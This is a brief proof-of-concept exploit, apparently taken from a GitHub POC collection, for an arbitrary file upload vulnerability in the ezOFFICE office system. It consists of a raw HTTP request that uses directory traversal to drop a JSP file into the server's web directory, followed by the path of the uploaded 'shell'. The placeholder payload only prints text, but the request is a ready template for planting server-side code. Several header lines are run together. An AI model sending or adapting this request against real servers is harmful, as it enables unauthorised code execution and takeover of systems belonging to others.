# ezOFFICE_fileupload
from:  https://github.com/wy876/POC/blob/main/%E4%B8%87%E6%88%B7ezoffice%20wpsservlet%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
```
POST /defaultroot/wpsservlet?option=saveNewFile&newdocId=apoxkq&dir=../platform/portal/layout/&fileType=.jsp HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Content-Length: 173Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Connection: close
Content-Type: multipart/form-data; boundary=ufuadpxathqvxfqnuyuqaozvseiueerpDNT: 1
Upgrade-Insecure-Requests: 1

--ufuadpxathqvxfqnuyuqaozvseiueerp
Content-Disposition: form-data; name="NewFile"; filename="apoxkq.jsp"

<% out.print("sasdfghjkj");%>
--ufuadpxathqvxfqnuyuqaozvseiueerp--
```
shell path:
`/defaultroot/platform/portal/layout/apoxkq.jsp`
